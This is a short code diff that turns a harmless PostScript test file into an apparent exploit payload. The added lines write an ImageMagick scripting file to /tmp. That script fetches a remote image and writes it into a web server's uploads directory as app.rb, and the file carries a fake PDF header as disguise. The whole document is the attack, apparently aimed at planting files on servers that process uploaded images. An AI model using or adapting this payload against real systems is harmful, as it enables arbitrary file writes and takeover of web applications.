@@ -1,3 +1,7 @@
-%!
-(I'm a PS file!\n) print
+ %!
+/outf (/tmp/msl.txt) (w) file def
+outf (<?xml version="1.0" encoding="UTF-8"?><image><read filename='https://http.cat/images/200.jpg'/><write filename='rgb:/var/www/html/uploads/app.rb' /></image>) writestring
+outf closefile 
+showpage
 quit
+%PDF-1.3
